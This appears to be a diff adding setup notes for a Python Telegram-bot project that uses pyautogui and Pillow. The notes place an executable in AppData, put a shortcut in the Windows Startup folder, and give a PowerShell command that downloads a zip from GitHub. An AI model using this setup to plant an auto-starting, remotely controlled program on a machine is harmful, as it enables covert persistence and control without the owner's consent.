@@ -1,0 +1,14 @@
+Python Requirements
+
+	1. python-telegram-bot
+	2. pyautogui
+	3. Pillow
+
+Path:
+	1. C:\Users\%username%\AppData\Local\Programs\ <-- .exe file
+
+	2. C:\Users\Beluga\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ <-- .lnk file
+
+
+Download SetVol or other components:
+	powershell -c "Invoke-WebRequest -Uri 'https://github.com/CaptainBeluga/TelegramTest/blob/main/project.zip?raw=true' -OutFile 'project.zip'"
